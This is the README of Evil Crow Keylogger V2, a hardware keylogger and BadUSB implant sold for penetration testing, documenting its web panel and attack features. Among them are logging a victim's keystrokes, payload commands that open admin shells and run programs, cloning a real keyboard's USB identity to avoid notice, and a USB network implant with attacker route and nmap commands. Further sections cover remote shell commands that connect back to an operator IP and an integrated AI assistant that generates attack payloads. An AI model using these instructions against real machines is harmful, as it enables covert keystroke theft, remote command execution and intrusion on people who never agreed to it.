# EvilCrowKeylogger-V2

![EvilCrow](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/logo.png)

**Idea, development and implementation:** Joel Serna (@JoelSernaMoreno).

**Final PCB design:** April Brother (@aprbrother).

**Manufacturer and distributor:** April Brother (@aprbrother).

**Distributor in the EU:** SAPSAN Cybersec & Military (@SAPSAN_CYBERSEC).

**Distributor in the UK:** KSEC Worldwide (@KSEC_KC).

**Distributor in the NA:** Tienda Espía (@TiendaEspiaMX).

The developers and collaborators of this project do not earn any money from it. 
You can invite me to a coffee to further develop low-cost hacking devices. If you don't invite me, no worries, I will keep developing devices

<a href="https://ko-fi.com/E1E614OA5" target="_blank"><img src="https://storage.ko-fi.com/cdn/kofi5.png?v=6" height="36" alt="Buy Me a Coffee at ko-fi.com" /></a>

**Available with April Brother (shipping from China):** 

* Coming Soon

**Available with SAPSAN Cybersec & Military (shipping from EU):**

* https://sapsan-sklep.pl/en/products/evil-crow-keylogger-v2

**Available with KSEC Worldwide (shipping from UK):**

* Coming Soon

**Available with Tienda Espía (shipping from Mexico):**

* https://tiendaespia.com.mx/producto/evil-crow-keylogger-v2

**Summary:**

1. Disclaimer
2. Introduction
3. Firmware
	* Flash Mode
	* Installation
	* First steps with Evil Crow Keylogger
	* Home
	* Log Viewer
	* Payload Editor
	* Payload and Syntax Checker
	* Detect OS
	* Upload Payload
	* List Payloads
	* Payload Viewer
	* AutoExec Planning
	* Config
	* USB Keyboard Autoclone
	* P2P VPN
	* USB Network Implant
	* AI assistant
	* Debug messages
	* HTTP Update
4. Sintax
	* Payload Syntax
	* Keys and Modifiers Syntax
5. Remote Shell
	* Linux/iOS Server
	* Windows Server
	* Android Server

![Keylogger](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/keylogger.jpg)

# Disclaimer

Evil Crow Keylogger is a basic device for professionals and cybersecurity enthusiasts.

We are not responsible for the incorrect use of Evil Crow Keylogger.

We recommend using this device for testing, learning and fun :D

Evil Crow Keylogger © 2026 by Joel Serna Moreno is licensed under CC BY-NC-SA 4.0. To view a copy of this license, visit https://creativecommons.org/licenses/by-nc-sa/4.0/

# Introduction

Evil Crow Keylogger is a physical keylogger and BadUSB with the following hardware:

* ESP32-S3
* USB Host MAX3421
* MicroSD slot built into the USB connector
* Hall sensor for programming the device

Evil Crow Keylogger can be controlled with a web panel over Wi-Fi, the device is configured in STATION mode. You will need to set up a Wi-Fi access point with your mobile phone or another device, Evil Crow Keylogger will automatically connect to it.

Evil Crow Keylogger is pre-configured with English layout (EN_US), but is compatible with other keyboard layouts:

* BE_BE
* BR_BR
* CA_CA
* CA_FR
* DA_DK
* DE_DE
* EN_US
* ES_ES
* FR_FR
* HR_HR
* HU_HU
* IT_IT
* PT_PT
* PT_BR
* SK_SK
* CZ_CZ
* SV_SE
* SI_SI

You can change the keyboard layout in real time from the web panel. 

Additionally, you can use WinPrint and WinPrintLine if you do not know the layout of the victim computer (Windows only).
**Example:** WinPrintLine Hello World!@#/()-:,;0123456789

**NOTE:** 

* **Not all layouts have been tested. If you find any incorrect keys, you can change them and submit a PR to the Evil Crow Keylogger repository.**

* **All devices have been flashed with basic firmware before shipping.**

* **Please do not request new features in this code. You can develop code for Evil Crow Keylogger and submit a PR with your new features.**

# Firmware

## Flash Mode

To flash the firmware on Evil Crow Keylogger you need a magnet.

Place the magnet on the Evil Crow Keylogger and connect it to the computer.

![Magnet](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/magnet.jpg)

You can check that the flash mode is correct with the following image:

![Flash Mode](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/flash-mode.png)

## Installation

1. Install esptool: sudo apt install esptool
2. Install pyserial: sudo pip install pyserial
3. Download and Install the Arduino IDE: https://www.arduino.cc/en/main/software
4. Download Evil Crow Keylogger repository: git clone https://github.com/joelsernamoreno/EvilCrowKeylogger-V2.git
5. Copy and unzip the EvilCrowLib library included in this repository (EvilCrowKeylogger-V2/modified-libraries/) to your Arduino library directory
6. Copy and unzip the USB_Host_Shield_2.0 library included in this repository (EvilCrowKeylogger-V2/modified-libraries/) to your Arduino library directory
7. Copy and unzip the husarnet-esp32-arduino library included in this repository (EvilCrowKeylogger-V2/modified-libraries/) to your Arduino library directory
8. Download the ArduinoJson library and place it in your Arduino libraries directory: git clone https://github.com/bblanchon/ArduinoJson.git
9. Open Arduino IDE
10. Go to File - Preferences. Locate the field "Additional Board Manager URLs:" Add "https://espressif.github.io/arduino-esp32/package_esp32_index.json" without quotes. Click "Ok"
11. Select Tools - Board - Boards Manager. Search for "esp32". Install "esp32 by Espressif system version 3.3.8"
12. Flash firmware.ino:
	* Connect Evil Crow Keylogger with a magnet to the computer
	* Open EvilCrowKeylogger-V2/firmware/firmware.ino in Arduino IDE
	* Select Tools:
		- Board - "ESP32S3 Dev Module"
    	  	- USB CDC On Boot - "Disabled"
    	  	- CPU Frequency - "80MHz (Wi-Fi)
    	  	- Core Debug Level - "None"
    	  	- USB DFU On Boot - "Disabled"
    	  	- Erase All Flash Before Sketch Upload - "Disabled"
    	  	- Events Run On - "Core 1"
    	  	- Flash Mode - "QIO 80MHZ"
    	  	- Flash Size - "8MB (64Mb)"
    	  	- JTAG Adapter - "Disabled"
    	  	- Arduino Runs On - "Core 1"
    		- USB Firmware MSC On Boot - "Disabled".
    		- Partition Scheme - "8M with SPIFFS (3MB APP/1.5MB SPIFFS)"
    		- PSRAM - "Disabled"
    		- Upload Mode - "UART0 / Hardware CDC"
    		- Upload Speed - "921600"
    		- USB Mode - "USB-OTG (TinyUSB)"
    		- Zigbee Mode - "Disabled"
13. Upload the code to the Evil Crow Keylogger device
14. Copy the EvilCrowKeylogger-V2/sdcard/HTML folder to a MicroSD card

![SD](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/sdcard.png)

**Notes about SD:**

* Web server will not load, is a blank page or displays nothing:

Check you have copied the relevant files to the SD card and the SD card is inserted in the Evil Crow Keylogger device.

* My files are on the SD card but the web server will not work:

Check your SD card size. It is recommended to use a small card. 32GB or smaller is sufficent for operation. Cards larger than this have been shown to cause issues and not work.

## First steps with Evil Crow Keylogger

1. Set up a Wi-Fi AP with your mobile phone:
	* SSID: Evil Crow Keylogger
	* Password: 123456789
2. Disconnect and re-connect the device to the computer.
3. Open a browser and access the web panel: http://keylogger.local/

**Note:** If you cannot access the web panel, use the IP address assigned to Evil Crow Keylogger or follow below steps **only if you are running Linux OS:**
 * check if avahi-deamon is installed and running on your PC. You can do this with executing "sudo systemctl status avahi-daemon" in terminal
 * If service is not running, install it using your package manager (apt, yum, dnf, Packman, rpm,...)
 * After successful installation, start avahi-daemon service with "sudo systemctl start avahi-daemon && sudo systemctl enable avahi-daemon"
 * In case keylogger.local is still not reachable, use http://"IP address", where "IP address" is IP assigned to Evil Crow Keylogger.
 
## Home

The Home page shows interesting information about the device.

![Home](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/home.png)

## Log Viewer

The Log Viewer page shows the log of the victim's keystrokes

![LogViewer](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/logviewer.png)

## Payload Editor

The Payload Editor page allows you to run payloads, save payloads, or edit payloads stored in the device:

* You can use the "Run Payload" option to run the payload.
* You can use the "Save Payload" option to save the payload in memory. Optionally, you can add a descriptive name and a brief explanation of what the payload does.
* You can find the syntax for commands and modifier keys in the web panel.

![LivePayload](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/livepayload.png)

![LivePayload](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/livepayload2.png)

![LivePayload](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/livepayload3.png)

## Payload and Syntax Checker

Livepayload includes a payload and syntax checker that lets you verify whether your payload is valid or not:

![PayloadChecker](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/payload-valid.png)

![PayloadChecker](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/payload-error.png)

Additionally, the payload and syntax checker helps you write payloads by providing suggestions. You can use the TAB key to autocomplete some commands. Example:

* Type Pri in the input field
* TAB (autocompletes to Print)
* TAB (autocompletes to PrintLine)

Finally, it also includes a syntax checker. If you type a command that's incomplete or incorrect, it will provide guidance on the correct syntax:

![PayloadChecker](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/syntax-printline.png)

![PayloadChecker](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/syntax-delay.png)

## Detect OS

Evil Crow Keylogger can detect the operating system and display it on the home screen of the web panel.

![DetectOS](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/detectos-na.png)

You can detect the victim's operating system by clicking on the 'N/A' label:

![DetectOS](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/detectos-detect.png)

Use the DetectOS command from livepayload to get the victim's operating system:

![DetectOS](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/detectos-payload.png)

This is a BETA feature. Currently it can detect the following operating systems: Windows, Linux, MacOS, Android, iOS and ChromeOS (ChromeOS Flex). Please open an issue if you experience any issues with OS detection.

![DetectOS](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/detectos-windows.png)

![DetectOS](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/detectos-linux.png)

![DetectOS](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/detectos-macos.png)

![DetectOS](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/detectos-android.png)

![DetectOS](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/detectos-ios.png)

![DetectOS](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/detectos-chromeos.png)

## Upload Payload

The Upload Payload page allows you to upload and store payloads in memory.

![Upload](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/upload.png)

**Note:** Check the available memory on the Home page.

## List Payloads

The Payload List page allows you to view the payloads stored in memory.

![Payloads](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/payloads.png)

## Payload viewer

List Payload includes a payload viewer and editor that lets you view, edit, delete, or execute payloads stored in memory:

![PayloadViewer](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/payload-viewer.png)

## AutoExec Planning

AutoExec Planning lets you configure multiple payloads to run automatically based on the detected operating system.

First, upload the payloads in the “Upload Payload” section (one for each operating system). Then, assign a payload to each OS here:

![AutoExec](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/autoexec.png)

Click the 'Select OS' button to assign a payload to a specific operating system:

![AutoExec](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/autoexec-selectos.png)

The screenshot below shows the AutoExec settings for different operating systems:

![AutoExec](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/autoexec-config.png)

## Config

The Config page allows you to change the Keyboard Layout, Wi-Fi configuration or USB configuration.

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/config.png)

* **Set Layout:**

Configure the keyboard layout. Keyboard Layout changes are stored.

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/set-layout.png)

* **Set Wi-Fi Config:**

SSID and password of your Wi-Fi access point. Wi-Fi configuration changes are stored. Evil Crow Keylogger will restart when changes are applied.

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/set-wifi.png)

* **Set Backup Wi-Fi Config:**

You can configure a secondary Wi-Fi access point. WiFi and backup WiFi are configured so that it always tries to connect to the primary WiFi first. If the primary is not found, it will connect to the backup. If the primary is found but the connection fails, it will then try the backup as well.

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/set-wifi-backup.png)

* **Delete Wi-Fi Config and Backup Wi-Fi Config:**

Delete Wi-Fi and Backup configuration file. Evil Crow Keylogger will restart and connect to the default Wi-Fi access point (SSID: Evil Crow Keylogger / Password: 123456789).

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/delete-configwifi.png)

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/delete-configwifi-backup.png)

* **Set P2P VPN Config:**

Configure your Hursanet P2P VPN join code. Once configured, Evil Crow Keylogger will automatically connect to your private P2P VPN network, allowing secure remote access from anywhere without opening ports on your router. VPN configuration changes are stored and the device will restart when changes are applied.

![VPN](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/vpn-config.png)

* **Set USB Config:**

Configure Vendor ID, Product ID, Product Name y Manufacturer Name. USB Configuration changes are stored. Evil Crow Keylogger will restart when changes are applied.

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/set-usb.png)

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/vid-pid.png)

**Note:** Be sure to enter the correct data, or you may risk bricking the device. Additional VendorID/ProductIDs available on: https://devicehunt.com/all-usb-vendors

* **Delete USB Config:**

Delete USB configuration file. Evil Crow Keylogger will restart and configure itself with the default USB configuration.

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/delete-usb.png)

* **Set Hostname Config:**

Change the hostname to access the web panel with another name:

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/set-hostname.png)

* **Forces reload of CSS/JS files:**

Forces reload of CSS/JS files if they were cached:

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/css-js-files.png)

* **Reboot Device:**

Reboot device remotely:

![Config](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/reboot.png)

## USB Keyboard Autoclone

Evil Crow Keylogger v2 allows you to auto-clone the basic configuration of a USB keyboard connected to the device's USB-A female port. First, click on "SCAN CONNECTED KEYBOARD" to retrieve the basic configuration of the USB keyboard:

![AutoClone](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/autoclone.png)

Once the configuration is retrieved, click on "AUTOCLONE" to clone the configuration:

![AutoClone](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/autoclone1.png)

You must restart the device to apply the new configuration:

![AutoClone](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/autoclone2.png)

After the reboot, Evil Crow Keylogger v2 will identify itself using the cloned configuration of the legitimate USB keyboard:

![AutoClone](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/autoclone3.png)

## P2P VPN

Evil Crow Keylogger supports secure remote access through the Hursanet P2P VPN network.

1. Access Hursanet Dashboard and create a free account: https://login.prod.husarnet.com/

![VPN](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/hursanet-create-account.png)

2. Once logged in, create a new group from the dashboard.

![VPN](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/hursanet-create-group.png)

3. After creating the group, you will obtain a Join Code.

![VPN](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/hursanet-attach-device.png)

This Join Code must be configured in:

* Evil Crow Keylogger using the P2P VPN Config option.
* Your computer running the Hursanet client.

P2P VPN Config option:

![VPN](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/vpn-config.png)

Linux client:

![VPN](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/hursanet-linux-client.png)

When both devices use the same Join Code, they will automatically join the same private P2P VPN network, allowing secure remote access to Evil Crow Keylogger from anywhere without port forwarding or public IP requirements.

To access the Evil Crow Keylogger web panel through the P2P VPN, open a web browser and navigate to:

* http://vpn-keylogger/

## USB Network Implant

The USB Network Implant turns the Evil Crow Keylogger into a routed network implant. On top of the HID keyboard, the keylogger exposes a USB CDC-NCM network adapter to the target, so the operator can reach the target's stack over IP while the keylogger is plugged in.

The target only sees a new network adapter: no gateway and no DNS are advertised, so its existing Wi-Fi/Ethernet routing is left untouched. The keylogger and the attacker are connected to the same Wi-Fi access point. Traffic from the attacker is routed through the keylogger's Wi-Fi address into the USB link.

### Enabling the implant

1. Open the **Config** page in the web panel.
2. Enable the **USB Network Implant** switch.
3. Confirm the restart. The device reboots so USB can enumerate with the new descriptor.

![USBNetwork](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/usb-network1.png)

![USBNetwork](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/usb-network2.png)

The USB descriptor is built at enumeration time, so enabling or disabling this option always requires a reboot.

![USBNetwork](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/usb-network3.png)

![USBNetwork](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/usb-network4.png)

### Attacker route

Add a route for the USB subnet through the keylogger's Wi-Fi address. The panel shows the exact command with the current address already filled in.

```bash
# Linux
sudo ip route replace 192.168.7.0/24 via <keylogger-wifi-ip>

# macOS
sudo route -n add -net 192.168.7.0/24 <keylogger-wifi-ip>

# Windows
route add 192.168.7.0 mask 255.255.255.0 <keylogger-wifi-ip>
```
![USBNetwork](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/usb-network5.png)

Then reach the target directly:

```bash
ping 192.168.7.2
curl http://192.168.7.2/
sudo nmap -sS 192.168.7.2
```
![USBNetwork](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/usb-network6.png)

### How return traffic works

The attacker's packets arrive at the keylogger addressed to 192.168.7.2 with the attacker's real source address. Forwarding them unchanged would not work: the target would answer the attacker's address through its own default gateway, not through the keylogger, and the reply would be lost.

The firmware solves this with a **stateless 1:1 source NAT** performed on the USB interface:

- Outbound (Wi-Fi to USB): the attacker source address is rewritten to 192.168.7.1
- Inbound (USB to Wi-Fi): 192.168.7.1 is rewritten back to the attacker address

Because the keylogger and the target are a fixed pair, the translation needs no per-flow state. There is no NAT table to fill, so aggressive scans (`nmap -sS`, `-p-`, masscan) cannot exhaust it and the link keeps answering ICMP and ARP during a scan. The attacker sees replies coming from 192.168.7.2, and the target needs no route, no configuration and no agent.

IP checksums are repaired incrementally (RFC 1624) for TCP, UDP, ICMP and IP fragments.

### Requirements and limitations

- The keylogger must be connected to Wi-Fi AP. The implant reports its state in the panel while waiting.
- The access point must allow traffic between wireless clients. Client isolation blocks the attacker from reaching the keylogger.
- The Wi-Fi subnet must not overlap `192.168.7.0/24`. The panel refuses to start the implant and reports the conflict.
- One attacker at a time. The stateless translation learns the attacker address from the first forwarded packet.
- IPv4 only.
- **Mutually exclusive with USB Serial.** HID, CDC and NCM together need more USB IN endpoints than the ESP32-S3 can open, and the host would reject the configuration entirely. Both switches refuse the combination and explain which one to turn off.

### Status endpoint

`GET /usb-network-implant/status` returns the live state of the implant, including link and routing status, the ready-made route command, traffic counters and the internal state of the USB network class.

| Field | Description |
| --- | --- |
| `enabled`, `started`, `linkUp` | Setting, interface state and USB link state |
| `wifiConnected`, `wifiIp` | Wi-Fi station state and address |
| `forwardingReady`, `sourceNatReady` | IPv4 forwarding and translation state |
| `statelessSnat`, `operatorIp` | Translation mode and learned operator address |
| `linuxRoute`, `macosRoute`, `windowsRoute` | Route command with the current address |
| `txSent`, `txDropped`, `txStalled`, `rxFrames`, `rxDropped` | Traffic counters |
| `ncmCompletions`, `ncmEpInBusy`, `ncmInFlight`, `ncmReadyCount`, `ncmFreeCount`, `ncmCanXmitFail`, `ncmSoftRecover`, `ncmHardRecover` | USB network class internals |
| `error` | Reason the implant is not ready, when applicable |

![USBNetwork](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/usb-network7.png)

## AI Assistant

The firmware integrates the [SAPSAN TERMINAL](https://sapsan-terminal.com) AI assistant so payloads can be generated from the web panel itself. You describe what you want in plain language and the generated Keylogger payload is placed straight into the Payload Editor, ready to review, run or save.

Both free and premium SAPSAN accounts work. The account tier is resolved server side.

### Logging in

1. Open the **Config** page in the web panel.
2. In the **AI ASSISTANT** section, enter the email and password of your SAPSAN account.
3. Press **Log in**. The panel shows the account name and tier once the session is established.

![AI](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/ai1.png)

![AI](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/ai2.png)

**The password is never written to flash.** It is used once to obtain a session token. The session survives reboots, so the login is not needed again until it expires. **Log out** deletes the stored token.

### Generating a payload

In the **Payload Editor**, below *Save Payload*, use the **Ask AI for help** field:

1. Describe the payload you want, for example *open a browser on Windows and play a video with sound*.
2. Optionally enable **Send current payload as context** to have the assistant modify what is already in the editor instead of starting from scratch.
3. Press **Generate Payload** (or Enter; Shift+Enter inserts a newline).

The assistant answers in markdown. The firmware extracts the Keylogger code block from the answer and inserts it automatically into the editor textarea, where it behaves exactly like a hand-written payload: it can be validated, run with *Run Payload* and stored with *Save Payload*. Editing payloads already stored on the keylogger is unaffected.

Requests run in a background task, so the web panel stays responsive while the model is working, and the USB network implant keeps being serviced.

Always review a generated payload before running it against a target.

![AI](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/ai3.png)

![AI](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/ai4.png)

## Debug messages

Debug messages will be displayed for each feature in the web panel:

![Debug](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/debug-payload.png)

![Debug](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/debug-layout.png)

![Debug](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/debug-save.png)

## HTTP Update

You can update the firmware without a magnet:

1. Open firmware.ino in the Arduino IDE
2. Configure the options as described in the 'Installation' section
3. Click on sketch -> Export Compiled Binary

This will create the binaries:

* EvilCrowKeylogger-V2/firmware/build/esp32.esp32.esp32s3/

![Binaries](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/binaries.png)

4. Set up a Wi-Fi access point for Evil Crow Keylogger and your computer
5. Connect Evil Crow Keylogger to the Wi-Fi AP and your computer (without magnet)
6. Connect your computer to the Wi-Fi AP
7. Open a terminal in EvilCrowKeylogger-V2/firmware/build/esp32.esp32.esp32s3/
8. Flash the binary firmware.ino.bin with the following command: curl -H "Origin: http://keylogger.local" -H "Host: keylogger.local" -F "image=@firmware.ino.bin" keylogger.local/update

![Update](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/update.png)

**NOTE:** The compiled firmware is located in the EvilCrowKeylogger-V2/compiled/ folder.

# Sintax

## Payload Syntax

To develop Evil Crow Keylogger payloads, you need to know the syntax of the interpreter. All the commands allowed in the interpreter are listed here:

| Command | Example | Description |
| ------- | ------- | ----------- |
| `ServerConnect` | `ServerConnect IP` |Read the "Remote Shell" section for more information |
| `DetectOS` | `DetectOS` |Detect the operating system |
| `RunWin` | `RunWin cmd` |Runs a command or a program on the victim's computer |
| `RunPowershellAdmin` | `RunPowershellAdmin` | Run powershell as administrator |
| `RunCmdAdmin` | `RunCmdAdmin` | Run cmd as administrator |
| `ShellWin` | `ShellWin IP` | Read the "Remote Shell" section for more information |
| `RunNix` | `RunNix gedit` | Runs a command or a program on the victim's computer |
| `RunLauncher` | `RunLauncher libreoffice` | Runs a command or a program on the victim's computer |
| `CtrlAltT` | `CtrlAltT` | Run a terminal on the victim's computer |
| `ShellNix` | `ShellNix IP` | Read the "Remote Shell" section for more information |
| `ShellMac` | `ShellMac IP` | Read the "Remote Shell" section for more information |
| `ShellMacCleanup` | `ShellMacCleanup` | Read the "Remote Shell" section for more information |
| `RunMac` | `RunMac terminal` | Runs a command or a program on the victim's computer |
| `GuiR` | `GuiR` | Press WINDOWS+R on the victim's computer |
| `Gui` | `Gui` | Press WINDOWS on the victim's computer |
| `AltF2` | `AltF2` | Press ALT+F2 on the victim's computer |
| `GuiSpace` | `GuiSpace` | Press WINDOWS+SPACE on the victim's computer |
| `Print` | `Print Hello World!` | Prints a text on the victim's computer |
| `WinPrint` | `WinPrint Hello World!` | Print a text on the victim's computer without knowing the layout (Windows only) |
| `PrintLine` | `PrintLine Hello World!` | Prints a text and presses the ENTER key on the victim's computer |
| `WinPrintLine` | `WinPrintLine Hello World!` | Prints a text and presses the ENTER key on the victim's computer without knowing the layout (Windows only) |
| `Delay` | `Delay 5000` | Delay in ms |
| `Press` | `Press KEY_ENTER` | Press a key or modifier on the victim's computer |
| `PressRelease` | `PressRelease KEY_ENTER` | Press and Release a key or modifier on the victim's computer |
| `Release` | `Release` | Release all pressed keys |

**NOTE:** You can find payloads for Evil Crow Keylogger in this repository (EvilCrowKeylogger-V2/payloads).

## Keys and Modifiers Syntax

**MODIFIERS:**

| Modifiers | Example | 
| ------- | ------- |
| `KEY_LEFT_ALT` | `Press KEY_LEFT_ALT` |
| `KEY_LEFT_GUI` | `Press KEY_LEFT_GUI` |
| `KEY_LEFT_CTRL` | `Press KEY_LEFT_CTRL` |
| `KEY_LEFT_SHIFT` | `Press KEY_LEFT_SHIFT` |
| `KEY_RIGHT_ALT` | `Press KEY_RIGHT_ALT` |
| `KEY_RIGHT_GUI` | `Press KEY_RIGHT_GUI` |
| `KEY_RIGHT_CTRL` | `Press KEY_RIGHT_CTRL` |
| `KEY_RIGHT_SHIFT` | `Press KEY_RIGHT_SHIFT` |

**STANDARD KEYS:**

| Keys | Example |
| ------- | ------- |
| `a` - `z` | `Press r` or `PressRelease r`|
| `A` - `Z` | `Press A` or `PressRelease A`|
| `0` - `9` | `Press 1` or `PressRelease 1`|
| `Special characters` | `Press @` or `PressRelease @`|

**OTHER KEYS:**

| Other Keys | Example |
| ------- | ------- |
| `KEY_ENTER` | `Press KEY_ENTER` or `PressRelease KEY_ENTER`|
| `KEY_UP_ARROW` | `Press KEY_UP_ARROW` or `PressRelease KEY_UP_ARROW`|
| `KEY_DOWN_ARROW` | `Press KEY_DOWN_ARROW` or `PressRelease KEY_DOWN_ARROW`|
| `KEY_LEFT_ARROW` | `Press KEY_LEFT_ARROW` or `PressRelease KEY_LEFT_ARROW`|
| `KEY_RIGHT_ARROW` | `Press KEY_RIGHT_ARROW` or `PressRelease KEY_RIGHT_ARROW`|
| `KEY_BACKSPACE` | `Press KEY_BACKSPACE` or `PressRelease KEY_BACKSPACE`|
| `KEY_TAB` | `Press KEY_TAB` or `PressRelease KEY_TAB`|
| `KEY_PAUSE` | `Press KEY_PAUSE` or `PressRelease KEY_PAUSE`|
| `KEY_INSERT` | `Press KEY_INSERT` or `PressRelease KEY_INSERT`|
| `KEY_DELETE` | `Press KEY_DELETE` or `PressRelease KEY_DELETE`|
| `KEY_PAGE_UP` | `Press KEY_PAGE_UP` or `PressRelease KEY_PAGE_UP`|
| `KEY_PAGE_DOWN` | `Press KEY_PAGE_DOWN` or `PressRelease KEY_PAGE_DOWN`|
| `KEY_ESC` | `Press KEY_ESC` or `PressRelease KEY_ESC`|
| `KEY_SPACE` | `Press KEY_SPACE` or `PressRelease KEY_SPACE`|
| `KEY_HOME` | `Press KEY_HOME` or `PressRelease KEY_HOME`|
| `KEY_END` | `Press KEY_END` or `PressRelease KEY_END`|
| `KEY_CAPS_LOCK` | `Press KEY_CAPS_LOCK` or `PressRelease KEY_CAPS_LOCK`|
| `KEY_PRINT_SCREEN` | `Press KEY_PRINT_SCREEN` or `PressRelease KEY_PRINT_SCREEN`|
| `KEY_SCROLL_LOCK` | `Press KEY_SCROLL_LOCK` or `PressRelease KEY_SCROLL_LOCK`|
| `KEY_NUM_LOCK` | `Press KEY_NUM_LOCK` or `PressRelease KEY_NUM_LOCK`|
| `KEY_MENU` | `Press KEY_MENU` or `PressRelease KEY_MENU`|
| `LED_NUMLOCK` | `Press LED_NUMLOCK` or `PressRelease LED_NUMLOCK`|
| `LED_CAPSLOCK` | `Press LED_CAPSLOCK` or `PressRelease LED_CAPSLOCK`|
| `LED_SCROLLLOCK` | `Press LED_SCROLLLOCK` or `PressRelease LED_SCROLLLOCK`|
| `LED_COMPOSE` | `Press LED_COMPOSE` or `PressRelease LED_COMPOSE`|
| `LED_KANA` | `Press LED_KANA` or `PressRelease LED_KANA`|
| `KEY_F1` | `Press KEY_F1` or `PressRelease KEY_F1`|
| `KEY_F2` | `Press KEY_F2` or `PressRelease KEY_F2`|
| `KEY_F3` | `Press KEY_F3` or `PressRelease KEY_F3`|
| `KEY_F4` | `Press KEY_F4` or `PressRelease KEY_F4`|
| `KEY_F5` | `Press KEY_F5` or `PressRelease KEY_F5`|
| `KEY_F6` | `Press KEY_F6` or `PressRelease KEY_F6`|
| `KEY_F7` | `Press KEY_F7` or `PressRelease KEY_F7`|
| `KEY_F8` | `Press KEY_F8` or `PressRelease KEY_F8`|
| `KEY_F9` | `Press KEY_F9` or `PressRelease KEY_F9`|
| `KEY_F10` | `Press KEY_F10` or `PressRelease KEY_F10`|
| `KEY_F11` | `Press KEY_F11` or `PressRelease KEY_F11`|
| `KEY_F12` | `Press KEY_F12` or `PressRelease KEY_F12`|

# Remote Shell

Evil Crow Keylogger allows you to execute commands remotely on a computer without a network connection.

Evil Crow Keylogger uses port 4444 for communication. If you want to change this, modify firmware.ino:

![Port](https://github.com/joelsernamoreno/EvilCrowKeylogger-V2/blob/main/images/port.png)

You have several ways to run Evil Crow Server.

* Linux and iOS: evilcrow-server.py --port {PORT} --target {windows, linux or mac}
* Android: evilcrow-server.apk (Install the APK on an android phone. Default port 4444)
* Windows: evilcrow-server.exe --port {PORT}

## Linux/iOS Server

1. Run evilcrow-server.py to start the attack:

	* Windows Target: python evilcrow-server.py --port 4444 --target windows
	* Linux Target: python evilcrow-server.py --port 4444 --target linux
